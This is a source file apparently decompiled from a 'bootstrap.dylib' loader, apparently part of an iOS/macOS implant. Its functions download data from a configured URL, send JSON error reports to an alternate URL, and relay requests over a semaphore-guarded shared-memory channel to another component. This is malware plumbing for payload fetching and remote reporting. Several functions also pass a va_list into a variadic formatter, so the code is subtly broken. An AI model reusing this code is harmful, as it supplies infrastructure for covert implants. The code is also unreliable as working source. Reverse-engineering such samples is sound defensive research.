/*
 * logging.m - Logging, reporting, and shared memory IPC
 *
 * Decompiled from bootstrap.dylib offsets 0x9300-0x9b5c
 */

#import "bootstrap.h"
#import <string.h>
#import <stdlib.h>
#import <stdarg.h>
#import <stdio.h>
#import <strings.h>

extern int thread_switch(mach_port_name_t, int, mach_msg_timeout_t);

void print_log(const char *fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    vdprintf(1, fmt, ap);
    dprintf(1, "\n");
    va_end(ap);
}

/* ── format_string (0x9a34) ────────────────────────────────────── */

uint32_t format_string(void **out_ptr, uint32_t *out_size,
                       const char *fmt, ...)
{
    uint32_t err = ERR_NULL_CTX;
    if (!out_ptr || !out_size || !fmt)
        return err;

    va_list ap;
    va_start(ap, fmt);
    int needed = vsnprintf(NULL, 0, fmt, ap);
    va_end(ap);

    if (needed < 1) {
        *out_ptr = NULL;
        *out_size = 0;
        return ERR_NULL_CTX + 0x13;
    }

    uint32_t alloc_size = (uint32_t)needed + 1;
    char *buf = (char *)malloc(alloc_size);
    if (!buf) {
        return ERR_NULL_CTX + 0x8;
    }

    va_list ap2;
    va_start(ap2, fmt);
    int written = vsnprintf(buf, alloc_size, fmt, ap2);
    va_end(ap2);

    if (written > needed) {
        bzero(buf, alloc_size);
        free(buf);
        *out_ptr = NULL;
        *out_size = 0;
        return ERR_NULL_CTX + 0xA;
    }

    buf[needed] = '\0';
    *out_ptr = buf;
    *out_size = written;
    return 0;
}

/* ── format_log_entry (0x94b4) ─────────────────────────────────── */

uint32_t format_log_entry(void **out_ptr, uint32_t *out_size,
                          const char *fmt, ...)
{
    void *inner = NULL;
    uint32_t inner_size = 0;
    uint32_t err;

    if (fmt) {
        va_list ap;
        va_start(ap, fmt);
        err = format_string(&inner, &inner_size, fmt, ap);
        va_end(ap);
    } else {
        va_list ap;
        va_start(ap, fmt);
        err = format_string(&inner, &inner_size, fmt, ap);
        va_end(ap);
    }

    if (err)
        return err;

    err = format_string(out_ptr, out_size,
        "{\"cmd\":\"logmsg\",\"args\":{\"msg\":\"%s\"}}",
        inner);

    bzero(inner, inner_size);
    free(inner);

    return err;
}

/* ── send_log (0x9300) ─────────────────────────────────────────── */

uint32_t send_log(bootstrap_ctx_t *ctx, const char *url,
                  void **out_data, uint32_t *out_size)
{
    uint32_t err = ERR_NULL_CTX;
    if (!ctx || !url)
        return err;
    if (!url[0] || !out_data || !out_size)
        return err;

    print_log("[bootstrap] send_log: url=%s shmem=%p", url, ctx->shared_memory);

    if (ctx->shared_memory) {
        return shared_mem_download(ctx, url, NULL, 60000,
                                   out_data, out_size);
    }

    char *ua = (char *)ctx->user_agent;
    return http_request(url, ua, NULL, NULL,
                        out_data, out_size);
}

/* ── format_and_send (0x9398) ──────────────────────────────────── */

uint32_t format_and_send(const char *url, const char *ua,
                         const char *body_fmt, ...)
{
    void *body_data = NULL;
    uint32_t body_size = 0;

    if (!url || !url[0])
        return 0;

    if (strncmp(url, "http://", 7) != 0 &&
        strncmp(url, "https://", 8) != 0) {
        return ERR_NULL_CTX + 0x13;
    }

    va_list ap;
    va_start(ap, body_fmt);
    uint32_t err = format_string(&body_data, &body_size, body_fmt, ap);
    va_end(ap);

    if (err)
        return err;

    print_log("[bootstrap] format_and_send: url=%s body_size=%u", url, body_size);
    err = http_request(url, ua, "application/json",
                       (const char *)body_data, NULL, NULL);

    bzero(body_data, body_size);
    free(body_data);

    return err;
}

/* ── send_report (0x9580) ──────────────────────────────────────── */

uint32_t send_report(bootstrap_ctx_t *ctx, uint32_t error,
                     const char *filename, uint32_t line)
{
    uint32_t err = ERR_NULL_CTX;
    if (!ctx)
        return err;

    print_log("[bootstrap] send_report: error=0x%x file=%s line=%u", error, filename ? filename : "(null)", line);

    void *report_data = NULL;
    uint32_t report_size = 0;
    void *response_data = NULL;
    uint32_t response_size = 0;

    if (ctx->shared_memory) {
        char *alt_url = ctx->alt_url;
        if (!alt_url || !alt_url[0])
            return 0;

        if (strncmp(alt_url, "http://", 7) != 0 &&
            strncmp(alt_url, "https://", 8) != 0) {
            return err + 0x13;
        }

        err = format_log_entry(&report_data, &report_size,
                               filename ?
                               "{\"e\":%u,\"f\":\"%s\",\"l\":%u}" :
                               "{\"e\":%u,\"l\":%u}",
                               error, filename, line);
        if (err)
            return err;

        err = shared_mem_download(ctx, alt_url,
                                  (const char *)report_data, 5000,
                                  &response_data, &response_size);

        if (err == 0x3012)
            err = 0;

        if (!err && response_data) {
            bzero(response_data, response_size);
            free(response_data);
            response_data = NULL;
        }

        bzero(report_data, report_size);
        free(report_data);

        return err;
    }

    char *ua = (char *)ctx->user_agent;
    char *alt = ctx->alt_url;

    return format_and_send(alt, ua,
                           filename ?
                           "{\"e\":%u,\"f\":\"%s\",\"l\":%u}" :
                           "{\"e\":%u,\"l\":%u}",
                           error, filename, line);
}

/* ── init_communication (0x96f8) ───────────────────────────────── */

uint32_t init_communication(bootstrap_ctx_t *ctx)
{
    if (!ctx)
        return ERR_NULL_CTX;

    print_log("[bootstrap] init_communication: shmem=%p", ctx->shared_memory);

    ctx->download_func = (fn_download_t)send_log;
    ctx->log_func = (fn_log_t)send_report;

    if (!ctx->shared_memory)
        return 0;

    kern_return_t kr = semaphore_create(mach_task_self(), &ctx->semaphore,
                                         0, 1);
    if (kr) {
        print_log("[bootstrap] init_communication: semaphore_create FAIL kr=0x%x", kr);
        return 0x80000000 | kr;
    }
    print_log("[bootstrap] init_communication: OK semaphore=%u", ctx->semaphore);
    return 0;
}

/* ── shared_mem_download (0x987c) ──────────────────────────────── */

uint32_t shared_mem_download(bootstrap_ctx_t *ctx, const char *url,
                             const char *body, uint32_t timeout,
                             void **out_data, uint32_t *out_size)
{
    uint32_t err = ERR_NULL_CTX;
    if (!out_data || !out_size)
        return err;

    *out_data = NULL;
    *out_size = 0;

    print_log("[bootstrap] shared_mem_download: url=%s timeout=%u body=%s", url, timeout, body ? "yes" : "no");

    if (semaphore_wait(ctx->semaphore)) {
        print_log("[bootstrap] shared_mem_download: semaphore_wait FAIL");
        return ERR_TIMEOUT;
    }

    if (!timeout)
        goto done_timeout;

    uint32_t remaining = timeout;
    uint8_t *shmem = (uint8_t *)ctx->shared_memory;

    while (remaining > 0) {
        uint32_t state = *(uint32_t *)shmem;
        if (state == 0)
            goto write_request;
        if (state == 5)
            goto wait_response;

        thread_switch(0, 2, 1);
        remaining--;
    }
    goto done_timeout;

write_request:
    strncpy((char *)(shmem + 4), url, 0x7FFFFC);
    shmem[0x7FFFFF] = '\0';

    if (body) {
        strncpy((char *)(shmem + 0x800000), body, 0x800000);
        shmem[0xFFFFFF] = '\0';
        *(uint32_t *)shmem = 7;
    } else {
        *(uint32_t *)shmem = 1;
    }

wait_response:
    {
        uint8_t *shmem2 = (uint8_t *)ctx->shared_memory;
        uint32_t state;

        while (timeout > 0) {
            state = *(uint32_t *)shmem2;
            if ((state - 3) < 2)
                goto got_response;

            thread_switch(0, 2, 1);
            timeout--;
        }

        *(uint32_t *)shmem2 = 0;
        err = ERR_TIMEOUT;
        goto signal_done;

    got_response:
        *(uint32_t *)shmem2 = 0;
        if (state != 3) {
            goto signal_done_ok;
        }

        uint32_t resp_size = *(uint32_t *)(shmem2 + 4);
        if (!resp_size) {
            err = 0x3012;
            goto signal_done;
        }

        void *copy = malloc(resp_size);
        if (!copy) {
            err += 0x8;
            goto signal_done;
        }

        memcpy(copy, shmem2 + 8, resp_size);
        err = 0;
        *out_data = copy;
        *out_size = resp_size;
        print_log("[bootstrap] shared_mem_download: got response size=%u", resp_size);
        goto signal_done;
    }

signal_done_ok:
    err = 0x3012;

signal_done:
    *(uint32_t *)((uint8_t *)ctx->shared_memory) = 0;
    semaphore_signal(ctx->semaphore);
    return err;

done_timeout:
    *(uint32_t *)((uint8_t *)ctx->shared_memory) = 0;
    err = ERR_TIMEOUT;
    print_log("[bootstrap] shared_mem_download: TIMEOUT");
    semaphore_signal(ctx->semaphore);
    return err;
}
